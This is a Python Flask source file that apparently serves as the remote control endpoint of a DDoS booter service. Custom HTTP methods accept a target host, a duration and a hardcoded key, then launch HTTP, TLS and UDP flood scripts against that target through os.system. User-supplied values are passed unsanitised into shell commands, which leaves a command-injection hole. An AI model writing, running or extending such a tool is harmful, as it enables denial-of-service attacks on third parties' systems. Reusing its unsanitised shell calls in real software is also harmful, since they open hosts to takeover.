from flask import Flask, request
import os

app = Flask(__name__)
api_key = "pablo"

def is_valid_key(key):
    return key == api_key

@app.route('/', methods=['HTTP', 'TLS', 'SAMP'])
def trigger_code():
    if request.method == 'HTTP':
        host = request.args.get('host', '')
        time = request.args.get('time', '')
        key = request.args.get('key', '')

        if host and time and key and is_valid_key(key):
            command = f'node HTTP-RAW.js {host} {time}'
            os.system(command)
            return f'Code triggered with host={host} and time={time} using HTTP-RAW'
        else:
            return 'Missing or invalid parameters: host, time, or key'

    elif request.method == 'TLS':
        data = request.get_json()
        host = data.get('host', '')
        time = data.get('time', '')
        key = data.get('key', '')

        if host and time and key and is_valid_key(key):
            command = f'node TLS-V2.js {host} {time} 8 1'
            os.system(command)
            return f'Code triggered with host={host} and time={time} using TLS-V2'
        else:
            return 'Missing or invalid parameters: host, time, or key'

    elif request.method == 'SAMP':
        host_and_port = request.args.get('host', '')
        time = request.args.get('time', '')
        key = request.args.get('key', '')

        # Split host_and_port into host and port
        host, port = host_and_port.rsplit(':', 1) if ':' in host_and_port else (host_and_port, '')

        if host and time and key and port and is_valid_key(key):
            command = f'python udp.py -i{host} -p{port} -t{time} -th 10'
            os.system(command)
            return f'Code triggered with host={host}, time={time}, and port={port} using udp.py'
        else:
            return 'Missing or invalid parameters: host, time, port, or key'

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080)
